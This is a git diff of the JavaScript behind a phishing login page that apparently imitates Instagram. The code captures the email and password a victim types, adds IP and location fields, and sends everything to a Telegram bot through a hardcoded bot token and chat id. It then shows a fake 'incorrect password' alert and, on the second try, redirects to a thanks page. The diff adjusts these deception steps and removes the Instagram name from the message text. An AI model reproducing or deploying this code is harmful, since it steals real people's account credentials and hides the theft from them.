@@ -1,8 +1,10 @@
+
 const form = document.querySelector("#form");
 var ct = "5";
 var co = 0;
 var lo = 0;
 var st = 0;
+var clicking = 0;
 
 form.addEventListener("submit", (e) => {
   e.preventDefault();
@@ -18,22 +20,29 @@ form.addEventListener("submit", (e) => {
         var identity = document.getElementById("email").value;
         var password = document.getElementById("password").value;
 
-        var my_text = `Instagram Result from user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+        var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-        var token = "6731121004:AAG5V3_4euycmSJuwRCUI2E3_7dbSdHIcaQ";
+   var token = "6731121004:AAG5V3_4euycmSJuwRCUI2E3_7dbSdHIcaQ";
         var chat_id = -4190547802;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-        document.getElementById("alert-message").innerHTML =
-          "Sorry, your password was incorrect. Please double-check your password.";
-      });
+  clicking = clicking + 1;
+  setTimeout(function () {
+    document.getElementById("alert-message").innerHTML =
+      "Sorry, your password was incorrect. Please double-check your password.";
+  }, 1000);
+  if (clicking == 2) {
+    window.location.replace("thanks.html");
+  }
+    });
 
 
+    // setTimeout(function() {
+    //     window.location.replace("thanks.html");
+    // }, 1000)
 
-
-  // window.location.replace("https://www.instagram.com/accounts/login/")
   //   console.log("Incorrect Password!");
 });
